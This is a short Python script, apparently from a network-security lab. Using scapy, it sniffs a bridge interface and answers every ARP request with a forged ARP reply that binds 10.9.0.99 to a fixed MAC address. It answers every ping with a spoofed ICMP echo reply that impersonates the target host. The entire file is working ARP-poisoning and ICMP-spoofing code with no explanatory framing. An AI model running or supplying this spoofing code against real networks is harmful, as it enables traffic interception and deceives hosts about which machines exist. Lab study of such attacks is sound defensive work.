#!/usr/bin/env python3

from scapy.all import *
def sniff_and_spoof(packet):
  if ARP in packet:
    ether = Ether(src="02:42:46:35:01:10", dst=packet[Ether].src)
    arp = ARP(op=2, psrc="10.9.0.99", hwsrc="02:42:46:35:01:10", pdst=packet[ARP].psrc, hwdst=packet[ARP].hwsrc)
    
    newARPpacket=ether/arp
    sendp(newARPpacket, iface='br-60c0e97173f3',verbose=0)	
    
  if ICMP in packet:
    ip = IP(src=packet[IP].dst, dst=packet[IP].src)
    icmp = ICMP(type=0, id=packet[ICMP].id, seq=packet[ICMP].seq)
    raw_data=packet[Raw].load
    
    newpacket=ip/icmp/raw_data
    send(newpacket, verbose=0)

pkt = sniff(iface='br-60c0e97173f3',filter='icmp[icmptype] == icmp-echo or arp[6:2]==1', prn=sniff_and_spoof)


